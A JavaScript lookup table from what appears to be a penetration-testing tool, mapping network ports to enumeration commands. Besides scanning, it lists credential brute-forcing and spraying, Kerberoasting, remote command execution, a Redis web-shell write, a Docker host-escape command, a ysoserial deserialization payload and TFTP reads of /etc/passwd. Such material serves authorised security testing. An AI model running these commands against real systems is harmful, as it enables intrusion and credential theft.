/**
 * Static lookup table mapping port numbers and service names to
 * recommended enumeration steps with example commands.
 *
 * Keys can be a port number (string) or a service name.
 * The component checks both when resolving recommendations.
 *
 * {target} is replaced at render time with the asset's IP/hostname.
 */

const PORT_RECOMMENDATIONS = {
  21: {
    service: 'FTP',
    items: [
      {
        title: 'Check for anonymous login',
        commands: ['ftp {target}', 'nmap -sV -p 21 --script=ftp-anon {target}'],
      },
      {
        title: 'Enumerate FTP version and vulnerabilities',
        commands: ['nmap -sV -p 21 --script=ftp-* {target}'],
      },
      {
        title: 'Brute-force FTP credentials',
        commands: ['hydra -L users.txt -P passwords.txt ftp://{target}'],
      },
      {
        title: 'Download all accessible files',
        commands: ['wget -m --no-passive ftp://anonymous:anonymous@{target}'],
      },
    ],
  },

  22: {
    service: 'SSH',
    items: [
      {
        title: 'Enumerate SSH version and algorithms',
        commands: ['nmap -sV -p 22 --script=ssh2-enum-algos,ssh-hostkey {target}', 'ssh -v {target}'],
      },
      {
        title: 'Check for weak / default credentials',
        commands: ['hydra -L users.txt -P passwords.txt ssh://{target}', 'ncrack -p 22 --user root -P passwords.txt {target}'],
      },
      {
        title: 'Enumerate users (if vulnerable)',
        commands: ['msf> use auxiliary/scanner/ssh/ssh_enumusers'],
      },
      {
        title: 'Test SSH with NetExec',
        commands: ['nxc ssh {target} -u user -p pass', 'nxc ssh {target} -u users.txt -p passwords.txt'],
      },
    ],
  },

  23: {
    service: 'Telnet',
    items: [
      {
        title: 'Banner grab and check for authentication',
        commands: ['telnet {target} 23', 'nmap -sV -p 23 --script=telnet-ntlm-info {target}'],
      },
      {
        title: 'Brute-force Telnet credentials',
        commands: ['hydra -L users.txt -P passwords.txt telnet://{target}'],
      },
    ],
  },

  25: {
    service: 'SMTP',
    items: [
      {
        title: 'Enumerate SMTP users (VRFY / EXPN / RCPT TO)',
        commands: [
          'smtp-user-enum -M VRFY -U users.txt -t {target}',
          'nmap -p 25 --script=smtp-enum-users {target}',
        ],
      },
      {
        title: 'Check for open relay',
        commands: ['nmap -p 25 --script=smtp-open-relay {target}'],
      },
      {
        title: 'Enumerate SMTP commands and version',
        commands: ['nmap -sV -p 25 --script=smtp-commands {target}'],
      },
    ],
  },

  53: {
    service: 'DNS',
    items: [
      {
        title: 'Attempt zone transfer',
        commands: ['dig axfr @{target}', 'dnsrecon -d <domain> -n {target} -t axfr'],
      },
      {
        title: 'Enumerate DNS records',
        commands: ['dnsrecon -d <domain> -n {target}', 'dnsenum --dnsserver {target} <domain>'],
      },
      {
        title: 'Brute-force subdomains',
        commands: ['gobuster dns -d <domain> -w subdomains.txt -r {target}:53'],
      },
      {
        title: 'Check for DNS cache snooping',
        commands: ['nmap -p 53 --script=dns-cache-snoop {target}'],
      },
    ],
  },

  80: {
    service: 'HTTP',
    items: [
      {
        title: 'Directory and file brute-force',
        commands: [
          'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt',
          'feroxbuster -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
          'dirsearch -u http://{target}',
        ],
      },
      {
        title: 'Subdomain enumeration',
        commands: ['gobuster vhost -u http://{target} -w subdomains.txt'],
      },
      {
        title: 'Technology fingerprinting',
        commands: ['whatweb http://{target}', 'wappalyzer http://{target}'],
      },
      {
        title: 'Scan for common vulnerabilities',
        commands: [
          'nmap -p 443 --script=http-vuln-*,ssl-* {target}',
          'nuclei -u https://{target} -as',
          'nuclei -u https://{target} -t cves/',
          'nuclei -u https://{target} -t exposures/',
          'nuclei -u https://{target} -t misconfiguration/',
          'nikto -h https://{target}'
        ],
      },
      {
        title: 'Check for virtual hosts',
        commands: ['gobuster vhost -u http://{target} -w subdomains.txt'],
      },
      {
        title: 'Spider / crawl the site',
        commands: ['gospider -s http://{target} -d 3', 'hakrawler -url http://{target} -depth 3'],
      },
      {
        title: 'Screenshot the web application',
        commands: ['gowitness single http://{target}', 'eyewitness --single http://{target}'],
      },
      {
        title: 'Test for SQL injection',
        commands: ['sqlmap -u "http://{target}/page?id=1" --batch --dbs'],
      },
      {
        title: 'Run Nuclei vulnerability scan',
        commands: [
          'nuclei -u http://{target} -as',
          'nuclei -u http://{target} -t cves/',
          'nuclei -u http://{target} -t exposures/',
          'nuclei -u http://{target} -t misconfiguration/',
        ],
      },
    ],
  },

  443: {
    service: 'HTTPS',
    items: [
      {
        title: 'Inspect SSL/TLS certificate',
        commands: [
          'openssl s_client -connect {target}:443 | openssl x509 -noout -text',
          'sslscan {target}',
          'sslyze {target}',
        ],
      },
      {
        title: 'Directory and file brute-force',
        commands: [
          'gobuster dir -u https://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -k',
          'feroxbuster -u https://{target} -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
        ],
      },
      {
        title: 'Technology fingerprinting',
        commands: ['whatweb https://{target}', 'curl -Ik https://{target}'],
      },
      {
        title: 'Scan for common vulnerabilities',
        commands: [
          'nmap -p 443 --script=http-vuln-*,ssl-* {target}',
          'nuclei -u https://{target} -as',
          'nuclei -u https://{target} -t cves/',
          'nuclei -u https://{target} -t exposures/',
          'nuclei -u https://{target} -t misconfiguration/',
          'nikto -h https://{target}'
        ],
      },
      {
        title: 'Check for virtual hosts',
        commands: ['gobuster vhost -u https://{target} -w subdomains.txt -k'],
      },
      {
        title: 'Spider / crawl the site',
        commands: ['gospider -s https://{target} -d 3', 'hakrawler -url https://{target} -depth 3'],
      },
      {
        title: 'Run Nuclei vulnerability scan',
        commands: [
          'nuclei -u https://{target} -as',
          'nuclei -u https://{target} -t cves/',
          'nuclei -u https://{target} -t exposures/',
          'nuclei -u https://{target} -t misconfiguration/',
        ],
      },
    ],
  },

  110: {
    service: 'POP3',
    items: [
      {
        title: 'Banner grab and enumerate capabilities',
        commands: ['nmap -sV -p 110 --script=pop3-capabilities,pop3-ntlm-info {target}'],
      },
      {
        title: 'Brute-force POP3 credentials',
        commands: ['hydra -L users.txt -P passwords.txt pop3://{target}'],
      },
    ],
  },

  111: {
    service: 'RPCbind',
    items: [
      {
        title: 'Enumerate RPC services',
        commands: ['rpcinfo -p {target}', 'nmap -sV -p 111 --script=rpcinfo {target}'],
      },
      {
        title: 'Check for NFS shares',
        commands: ['showmount -e {target}', 'nmap -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs {target}'],
      },
    ],
  },

  135: {
    service: 'MSRPC',
    items: [
      {
        title: 'Enumerate RPC endpoints',
        commands: ['rpcclient -U "" -N {target}', 'impacket-rpcdump {target}'],
      },
      {
        title: 'Enumerate users and groups via RPC',
        commands: [
          'rpcclient -U "" -N {target} -c "enumdomusers"',
          'rpcclient -U "" -N {target} -c "enumdomgroups"',
        ],
      },
    ],
  },

  139: {
    service: 'NetBIOS',
    items: [
      {
        title: 'Enumerate NetBIOS names and sessions',
        commands: ['nbtscan {target}', 'nmblookup -A {target}'],
      },
      {
        title: 'Full SMB enumeration (see port 445)',
        commands: ['enum4linux -a {target}'],
      },
    ],
  },

  143: {
    service: 'IMAP',
    items: [
      {
        title: 'Banner grab and enumerate capabilities',
        commands: ['nmap -sV -p 143 --script=imap-capabilities,imap-ntlm-info {target}'],
      },
      {
        title: 'Brute-force IMAP credentials',
        commands: ['hydra -L users.txt -P passwords.txt imap://{target}'],
      },
    ],
  },

  161: {
    service: 'SNMP',
    items: [
      {
        title: 'Enumerate SNMP community strings',
        commands: ['onesixtyone -c community.txt {target}', 'nmap -sU -p 161 --script=snmp-brute {target}'],
      },
      {
        title: 'Walk SNMP MIB tree',
        commands: [
          'snmpwalk -v2c -c public {target}',
          'snmp-check {target}',
        ],
      },
      {
        title: 'Extract user accounts and processes',
        commands: [
          'snmpwalk -v2c -c public {target} 1.3.6.1.4.1.77.1.2.25',
          'snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.4.2.1.2',
        ],
      },
    ],
  },

  389: {
    service: 'LDAP',
    items: [
      {
        title: 'Enumerate LDAP base DN and naming contexts',
        commands: [
          'ldapsearch -x -H ldap://{target} -s base namingcontexts',
          'nmap -p 389 --script=ldap-rootdse {target}',
        ],
      },
      {
        title: 'Dump LDAP directory (anonymous bind)',
        commands: ['ldapsearch -x -H ldap://{target} -b "DC=domain,DC=com" "(objectclass=*)"'],
      },
      {
        title: 'Enumerate users and groups',
        commands: ['ldapsearch -x -H ldap://{target} -b "DC=domain,DC=com" "(objectclass=user)" sAMAccountName'],
      },
      {
        title: 'Brute-force LDAP bind credentials',
        commands: ['hydra -L users.txt -P passwords.txt ldap2://{target}'],
      },
      {
        title: 'Enumerate with NetExec',
        commands: [
          'nxc ldap {target} -u user -p pass --users',
          'nxc ldap {target} -u user -p pass --groups',
          'nxc ldap {target} -u "" -p "" --users',
        ],
      },
    ],
  },

  636: {
    service: 'LDAPS',
    items: [
      {
        title: 'Enumerate LDAPS (same as LDAP over TLS)',
        commands: ['ldapsearch -x -H ldaps://{target} -s base namingcontexts'],
      },
      {
        title: 'Inspect TLS certificate for domain info',
        commands: ['openssl s_client -connect {target}:636 | openssl x509 -noout -text'],
      },
    ],
  },

  445: {
    service: 'SMB',
    items: [
      {
        title: 'Enumerate SMB shares',
        commands: [
          'smbclient -L //{target} -N',
          'nxc smb {target} --shares',
          'nmap -p 445 --script=smb-enum-shares {target}',
        ],
      },
      {
        title: 'Check for null session / guest access',
        commands: [
          'smbclient //{target}/share -N',
          'rpcclient -U "" -N {target}',
          'enum4linux -a {target}',
        ],
      },
      {
        title: 'Enumerate users, groups, and password policy',
        commands: [
          'nxc smb {target} --users',
          'nxc smb {target} --groups',
          'nxc smb {target} --pass-pol',
          'enum4linux -U -G -P {target}',
        ],
      },
      {
        title: 'Check for known SMB vulnerabilities (EternalBlue, etc.)',
        commands: [
          'nmap -p 445 --script=smb-vuln-* {target}',
          'nxc smb {target} -M ms17-010',
        ],
      },
      {
        title: 'Brute-force SMB credentials',
        commands: ['nxc smb {target} -u users.txt -p passwords.txt'],
      },
      {
        title: 'Spider readable shares for sensitive files',
        commands: ['nxc smb {target} -u user -p pass --spider C$ --pattern ".(txt|xml|config|ini|cfg|bak|ps1|bat)$"'],
      },
      {
        title: 'Enumerate with NetExec (nxc)',
        commands: [
          'nxc smb {target}',
          'nxc smb {target} --shares',
          'nxc smb {target} --users',
          'nxc smb {target} --groups',
          'nxc smb {target} --pass-pol',
        ],
      },
      {
        title: 'Spray credentials with NetExec',
        commands: ['nxc smb {target} -u users.txt -p passwords.txt', 'nxc smb {target} -u users.txt -p passwords.txt --continue-on-success'],
      },
    ],
  },

  1433: {
    service: 'MSSQL',
    items: [
      {
        title: 'Enumerate MSSQL version and instance',
        commands: ['nmap -sV -p 1433 --script=ms-sql-info {target}', 'impacket-mssqlclient {target}'],
      },
      {
        title: 'Brute-force MSSQL credentials',
        commands: [
          'hydra -L users.txt -P passwords.txt mssql://{target}',
          'nxc mssql {target} -u users.txt -p passwords.txt',
        ],
      },
      {
        title: 'Check for xp_cmdshell and code execution',
        commands: ['nxc mssql {target} -u user -p pass -x "whoami"'],
      },
      {
        title: 'Enumerate databases and tables',
        commands: ['impacket-mssqlclient user:pass@{target} -windows-auth'],
      },
      {
        title: 'Enumerate and execute with NetExec',
        commands: [
          'nxc mssql {target} -u user -p pass',
          'nxc mssql {target} -u user -p pass -x "whoami"',
          'nxc mssql {target} -u user -p pass --local-auth -q "SELECT name FROM sys.databases"',
        ],
      },
    ],
  },

  3306: {
    service: 'MySQL',
    items: [
      {
        title: 'Enumerate MySQL version',
        commands: ['nmap -sV -p 3306 --script=mysql-info {target}', 'mysql -h {target} -u root'],
      },
      {
        title: 'Check for anonymous / no-password login',
        commands: ['mysql -h {target} -u root --password=""'],
      },
      {
        title: 'Brute-force MySQL credentials',
        commands: ['hydra -L users.txt -P passwords.txt mysql://{target}'],
      },
      {
        title: 'Enumerate databases',
        commands: ['nmap -p 3306 --script=mysql-databases --script-args="mysqluser=root" {target}'],
      },
    ],
  },

  3389: {
    service: 'RDP',
    items: [
      {
        title: 'Check for NLA and encryption settings',
        commands: ['nmap -sV -p 3389 --script=rdp-enum-encryption,rdp-ntlm-info {target}'],
      },
      {
        title: 'Check for BlueKeep (CVE-2019-0708)',
        commands: ['nmap -p 3389 --script=rdp-vuln-ms12-020 {target}', 'msf> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep'],
      },
      {
        title: 'Brute-force RDP credentials',
        commands: ['hydra -L users.txt -P passwords.txt rdp://{target}', 'crowbar -b rdp -s {target}/32 -U users.txt -C passwords.txt'],
      },
      {
        title: 'Screenshot the RDP login screen',
        commands: ['nmap -p 3389 --script=rdp-vuln-ms12-020 {target}'],
      },
      {
        title: 'Test RDP with NetExec',
        commands: ['nxc rdp {target} -u user -p pass', 'nxc rdp {target} -u users.txt -p passwords.txt'],
      },
    ],
  },

  5432: {
    service: 'PostgreSQL',
    items: [
      {
        title: 'Enumerate PostgreSQL version',
        commands: ['nmap -sV -p 5432 {target}', 'psql -h {target} -U postgres'],
      },
      {
        title: 'Brute-force PostgreSQL credentials',
        commands: ['hydra -L users.txt -P passwords.txt postgres://{target}'],
      },
      {
        title: 'Check for default credentials',
        commands: ['psql -h {target} -U postgres -W'],
      },
      {
        title: 'Enumerate databases and tables',
        commands: ['psql -h {target} -U postgres -c "\\l"'],
      },
    ],
  },

  5985: {
    service: 'WinRM',
    items: [
      {
        title: 'Test WinRM authentication',
        commands: ['evil-winrm -i {target} -u user -p pass', 'nxc winrm {target} -u user -p pass'],
      },
      {
        title: 'Brute-force WinRM credentials',
        commands: ['nxc winrm {target} -u users.txt -p passwords.txt'],
      },
      {
        title: 'Execute commands via WinRM',
        commands: ['evil-winrm -i {target} -u user -p pass -e /path/to/scripts'],
      },
      {
        title: 'Test WinRM with NetExec',
        commands: ['nxc winrm {target} -u user -p pass', 'nxc winrm {target} -u user -p pass -x "whoami"'],
      },
    ],
  },

  5986: {
    service: 'WinRM (HTTPS)',
    items: [
      {
        title: 'Test WinRM over HTTPS',
        commands: ['evil-winrm -i {target} -u user -p pass -S', 'nxc winrm {target} -u user -p pass --ssl'],
      },
    ],
  },

  6379: {
    service: 'Redis',
    items: [
      {
        title: 'Check for unauthenticated access',
        commands: ['redis-cli -h {target} INFO', 'nmap -p 6379 --script=redis-info {target}'],
      },
      {
        title: 'Enumerate keys and databases',
        commands: ['redis-cli -h {target} KEYS "*"', 'redis-cli -h {target} CONFIG GET databases'],
      },
      {
        title: 'Attempt command execution via Redis',
        commands: ['redis-cli -h {target} CONFIG SET dir /var/www/html', 'redis-cli -h {target} CONFIG SET dbfilename shell.php'],
      },
    ],
  },

  8080: {
    service: 'HTTP Proxy / Alt HTTP',
    items: [
      {
        title: 'Directory and file brute-force',
        commands: [
          'gobuster dir -u http://{target}:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt',
          'feroxbuster -u http://{target}:8080',
        ],
      },
      {
        title: 'Technology fingerprinting',
        commands: ['whatweb http://{target}:8080', 'curl -I http://{target}:8080'],
      },
      {
        title: 'Scan for common vulnerabilities',
        commands: [
          'nmap -p 443 --script=http-vuln-*,ssl-* {target}',
          'nuclei -u https://{target} -as',
          'nuclei -u https://{target} -t cves/',
          'nuclei -u https://{target} -t exposures/',
          'nuclei -u https://{target} -t misconfiguration/',
          'nikto -h https://{target}'
        ],
      },
    ],
  },

  8443: {
    service: 'HTTPS Alt',
    items: [
      {
        title: 'Inspect SSL/TLS certificate',
        commands: ['openssl s_client -connect {target}:8443 | openssl x509 -noout -text', 'sslscan {target}:8443'],
      },
      {
        title: 'Directory brute-force',
        commands: ['gobuster dir -u https://{target}:8443 -w /usr/share/wordlists/dirb/common.txt -k'],
      },
      {
        title: 'Scan for common vulnerabilities',
        commands: [
          'nmap -p 443 --script=http-vuln-*,ssl-* {target}',
          'nuclei -u https://{target} -as',
          'nuclei -u https://{target} -t cves/',
          'nuclei -u https://{target} -t exposures/',
          'nuclei -u https://{target} -t misconfiguration/',
          'nikto -h https://{target}'
        ],
      },
    ],
  },

  2049: {
    service: 'NFS',
    items: [
      {
        title: 'List NFS exports',
        commands: ['showmount -e {target}', 'nmap -p 2049 --script=nfs-ls,nfs-showmount,nfs-statfs {target}'],
      },
      {
        title: 'Mount and browse accessible shares',
        commands: ['mount -t nfs {target}:/share /mnt/nfs'],
      },
    ],
  },

  88: {
    service: 'Kerberos',
    items: [
      {
        title: 'Enumerate valid usernames (Kerbrute)',
        commands: ['kerbrute userenum -d domain.com --dc {target} users.txt'],
      },
      {
        title: 'AS-REP Roasting (no pre-auth users)',
        commands: ['impacket-GetNPUsers domain.com/ -dc-ip {target} -usersfile users.txt -no-pass -format hashcat'],
      },
      {
        title: 'Kerberoasting',
        commands: ['impacket-GetUserSPNs domain.com/user:pass -dc-ip {target} -request'],
      },
    ],
  },

  1099: {
    service: 'Java RMI',
    items: [
      {
        title: 'Enumerate RMI registry',
        commands: ['nmap -sV -p 1099 --script=rmi-dumpregistry {target}'],
      },
      {
        title: 'Check for deserialization vulnerabilities',
        commands: ['java -jar ysoserial.jar CommonsCollections1 "cmd" | nc {target} 1099'],
      },
    ],
  },

  27017: {
    service: 'MongoDB',
    items: [
      {
        title: 'Check for unauthenticated access',
        commands: ['mongosh --host {target}', 'nmap -p 27017 --script=mongodb-info,mongodb-databases {target}'],
      },
      {
        title: 'Enumerate databases',
        commands: ['mongosh --host {target} --eval "db.adminCommand({listDatabases:1})"'],
      },
    ],
  },

  69: {
    service: 'TFTP',
    items: [
      {
        title: 'Enumerate TFTP and list files',
        commands: ['nmap -sU -p 69 --script=tftp-enum {target}', 'tftp {target} -c get /etc/passwd'],
      },
      {
        title: 'Request common config files',
        commands: ['tftp {target} -c get config.xml', 'tftp {target} -c get startup-config'],
      },
    ],
  },

  123: {
    service: 'NTP',
    items: [
      {
        title: 'Query NTP mode and version',
        commands: ['ntpdate -q {target}', 'nmap -sU -p 123 --script=ntp-info,ntp-monlist {target}'],
      },
      {
        title: 'Check for monlist amplification',
        commands: ['nmap -sU -p 123 --script=ntp-monlist {target}'],
      },
    ],
  },

  512: {
    service: 'rexec',
    items: [
      {
        title: 'Test rexec (often disabled)',
        commands: ['rexec -l user -p pass {target} id', 'nmap -p 512 -sV --script=rexec-brute {target}'],
      },
    ],
  },

  513: {
    service: 'rlogin',
    items: [
      {
        title: 'Test rlogin',
        commands: ['rlogin -l user {target}', 'nmap -p 513 -sV {target}'],
      },
    ],
  },

  514: {
    service: 'rsh / syslog',
    items: [
      {
        title: 'Test rsh (remote shell)',
        commands: ['rsh -l user {target} id', 'nmap -p 514 -sV {target}'],
      },
      {
        title: 'If syslog: check for injection / info leak',
        commands: ['nmap -p 514 -sU --script=syslog-enum {target}'],
      },
    ],
  },

  993: {
    service: 'IMAPS',
    items: [
      {
        title: 'Banner and capabilities over TLS',
        commands: ['nmap -sV -p 993 --script=ssl-cert,imap-capabilities {target}'],
      },
      {
        title: 'Brute-force IMAPS credentials',
        commands: ['hydra -L users.txt -P passwords.txt imaps://{target}'],
      },
    ],
  },

  995: {
    service: 'POP3S',
    items: [
      {
        title: 'Banner and TLS certificate',
        commands: ['nmap -sV -p 995 --script=ssl-cert,pop3-capabilities {target}'],
      },
      {
        title: 'Brute-force POP3S credentials',
        commands: ['hydra -L users.txt -P passwords.txt pop3s://{target}'],
      },
    ],
  },

  1521: {
    service: 'Oracle TNS',
    items: [
      {
        title: 'Enumerate Oracle version and SIDs',
        commands: ['nmap -sV -p 1521 --script=oracle-sid-brute {target}', 'odat sidguesser -s {target}'],
      },
      {
        title: 'Brute-force Oracle credentials',
        commands: ['hydra -L users.txt -P passwords.txt oracle://{target}/SID', 'odat passwordguesser -s {target} -d SID'],
      },
    ],
  },

  2375: {
    service: 'Docker (unencrypted)',
    items: [
      {
        title: 'List containers and images',
        commands: ['curl -s http://{target}:2375/containers/json', 'docker -H tcp://{target}:2375 ps -a'],
      },
      {
        title: 'Check for unauthenticated API',
        commands: ['docker -H tcp://{target}:2375 info', 'docker -H tcp://{target}:2375 run -it --rm -v /:/host alpine chroot /host bash'],
      },
    ],
  },

  3128: {
    service: 'Squid / HTTP Proxy',
    items: [
      {
        title: 'Probe proxy and check for open relay',
        commands: ['curl -x http://{target}:3128 http://example.com', 'nmap -p 3128 --script=http-open-proxy {target}'],
      },
      {
        title: 'Enumerate proxy version and config',
        commands: ['curl -v http://{target}:3128', 'nmap -sV -p 3128 {target}'],
      },
    ],
  },

  3268: {
    service: 'LDAP Global Catalog',
    items: [
      {
        title: 'Query Global Catalog (AD)',
        commands: ['ldapsearch -x -H ldap://{target}:3268 -s base', 'nxc ldap {target} -p 3268 -u user -p pass'],
      },
      {
        title: 'Enumerate forest/domain via GC',
        commands: ['ldapsearch -x -H ldap://{target}:3268 -b "DC=domain,DC=com" "(objectClass=*)"'],
      },
    ],
  },

  5000: {
    service: 'UPnP / Dev HTTP',
    items: [
      {
        title: 'Fingerprint and enumerate (often Flask/Docker)',
        commands: ['curl -s http://{target}:5000', 'nmap -sV -p 5000 --script=http-enum {target}'],
      },
      {
        title: 'Directory brute-force',
        commands: ['gobuster dir -u http://{target}:5000 -w /usr/share/wordlists/dirb/common.txt'],
      },
    ],
  },

  5900: {
    service: 'VNC',
    items: [
      {
        title: 'Check VNC auth and version',
        commands: ['nmap -sV -p 5900 --script=vnc-info,vnc-brute {target}', 'vncviewer {target}:0'],
      },
      {
        title: 'Brute-force VNC password',
        commands: ['hydra -P vnc_passwords.txt {target} vnc', 'ncrack -p 5900 -p pass.txt {target}'],
      },
    ],
  },

  5984: {
    service: 'CouchDB',
    items: [
      {
        title: 'Check for unauthenticated CouchDB',
        commands: ['curl -s http://{target}:5984/', 'curl -s http://{target}:5984/_all_dbs'],
      },
      {
        title: 'Enumerate databases and config',
        commands: ['curl -s http://{target}:5984/_config', 'curl -s http://{target}:5984/_users'],
      },
    ],
  },

  8000: {
    service: 'Alt HTTP',
    items: [
      {
        title: 'Fingerprint (often Django, Jira, etc.)',
        commands: ['curl -sI http://{target}:8000', 'whatweb http://{target}:8000'],
      },
      {
        title: 'Directory brute-force',
        commands: ['gobuster dir -u http://{target}:8000 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt'],
      },
      {
        title: 'Scan for common vulnerabilities',
        commands: [
          'nmap -p 443 --script=http-vuln-*,ssl-* {target}',
          'nuclei -u https://{target} -as',
          'nuclei -u https://{target} -t cves/',
          'nuclei -u https://{target} -t exposures/',
          'nuclei -u https://{target} -t misconfiguration/',
          'nikto -h https://{target}'
        ],
      },
    ],
  },

  9000: {
    service: 'SonarQube / PHP-FPM / other',
    items: [
      {
        title: 'Fingerprint and enumerate',
        commands: ['curl -s http://{target}:9000', 'nmap -sV -p 9000 --script=http-enum {target}'],
      },
      {
        title: 'Check for default credentials',
        commands: ['curl -s http://{target}:9000/api/authentication/validate'],
      },
    ],
  },

  9200: {
    service: 'Elasticsearch',
    items: [
      {
        title: 'Check cluster and indices (often no auth)',
        commands: ['curl -s http://{target}:9200/', 'curl -s http://{target}:9200/_cat/indices'],
      },
      {
        title: 'Enumerate indices and search',
        commands: ['curl -s http://{target}:9200/_all', 'curl -s "http://{target}:9200/_search?pretty"'],
      },
    ],
  },

  11211: {
    service: 'Memcached',
    items: [
      {
        title: 'Check for unauthenticated Memcached',
        commands: ['echo "stats" | nc -nv {target} 11211', 'nmap -p 11211 --script=memcached-info {target}'],
      },
      {
        title: 'Dump stats and items',
        commands: ['echo "stats items" | nc -nv {target} 11211', 'memcached-tool {target}:11211 stats'],
      },
    ],
  },
};

export const SERVICE_ALIASES = {
  ssh: 22,
  ftp: 21,
  smtp: 25,
  dns: 53,
  'domain': 53,
  http: 80,
  https: 443,
  'http-proxy': 8080,
  pop3: 110,
  imap: 143,
  snmp: 161,
  ldap: 389,
  ldaps: 636,
  'microsoft-ds': 445,
  'netbios-ssn': 139,
  msrpc: 135,
  'ms-sql-s': 1433,
  mssql: 1433,
  mysql: 3306,
  'ms-wbt-server': 3389,
  rdp: 3389,
  postgresql: 5432,
  postgres: 5432,
  'wsman': 5985,
  winrm: 5985,
  redis: 6379,
  nfs: 2049,
  kerberos: 88,
  'kerberos-sec': 88,
  rmiregistry: 1099,
  mongod: 27017,
  mongodb: 27017,
  telnet: 23,
  rpcbind: 111,
  tftp: 69,
  ntp: 123,
  rexec: 512,
  rlogin: 513,
  rsh: 514,
  syslog: 514,
  imaps: 993,
  pop3s: 995,
  'oracle-tns': 1521,
  oracle: 1521,
  docker: 2375,
  squid: 3128,
  'global-catalog': 3268,
  gc: 3268,
  vnc: 5900,
  couchdb: 5984,
  elasticsearch: 9200,
  memcached: 11211,
};

export const GENERIC_RECOMMENDATION = {
  service: 'Unknown Service',
  items: [
    {
      title: 'Banner grab and version detection',
      commands: ['nmap -sV -sC -p {port} {target}', 'nc -nv {target} {port}'],
    },
    {
      title: 'Search for known vulnerabilities',
      commands: ['searchsploit <service_name>', 'nmap -p {port} --script=vulners {target}'],
    },
  ],
};

export default PORT_RECOMMENDATIONS;
